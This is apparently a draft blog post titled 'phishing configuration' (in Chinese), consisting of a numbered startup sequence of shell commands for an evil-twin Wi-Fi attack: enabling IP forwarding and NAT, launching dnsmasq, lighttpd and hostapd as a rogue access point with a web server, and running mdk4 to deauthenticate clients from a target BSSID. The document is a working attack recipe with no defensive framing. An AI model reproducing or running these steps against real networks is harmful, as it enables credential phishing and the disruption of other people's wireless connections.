+++
date = '2026-04-02T16:20:07+08:00'
draft = true
title = '钓鱼配置'
+++

# 启动顺序

```
# 1. 开启转发
echo 1 > /proc/sys/net/ipv4/ip_forward

# 2. NAT
iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE

# 3. 启动dnsmasq
dnsmasq -C dnsmasq.conf

# 4. 启动lighttpd
lighttpd -f lighttpd.conf

# 5. 启动hostapd
hostapd hostapd.conf

# 6. deauth
mdk4 wlan1 d -t BSSID
```

